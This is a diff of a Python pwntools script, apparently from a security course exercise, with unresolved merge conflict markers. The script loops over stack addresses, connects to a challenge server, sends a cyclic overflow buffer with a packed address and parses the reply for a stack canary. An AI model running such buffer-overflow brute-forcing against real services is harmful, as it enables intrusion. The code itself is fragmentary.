@@ -4,8 +4,26 @@ context.log_level = "debug"
 
 maxAdress = 0x7ffffffff000
 minAdress = 0x7fffffffb000
+<<<<<<< HEAD
 for i in range (maxAdress,minAdress , -0x4):
     io = remote('inf226.puffling.no', 7003)
+=======
+rangeAdress = int(maxAdress - minAdress)
+#io = process(['setarch','-R', './03'])
+for i in range (minAdress,maxAdress, 0x8):
+    #io = process(['setarch','-R', './03'])
+
+    io = remote("inf226.puffling.no", 7003)
+
+    #correctedStart = int(i) - int(minAdress)
+    #howmuchdone = (correctedStart * 100) / rangeAdress
+    #print(howmuchdone)
+    #io = process(['setarch','-R', './03'])
+
+    io.send(cyclic(10000) + p64(i))
+    maybeCanary = io.recvuntil(b'.').strip().decode().split(' ')[-1].replace('line)\n', '').replace('.', '')
+    maybeCanary = maybeCanary.replace('line)', '')
+>>>>>>> 96219ca (s)
 
     
 
@@ -39,5 +57,14 @@ for i in range (maxAdress,minAdress , -0x4):
         io.close()
         
 
+<<<<<<< HEAD
     
+=======
+    io.shutdown('out')
+
+    print(io.readall())
+
+    io.close()
+
+>>>>>>> 96219ca (s)
 
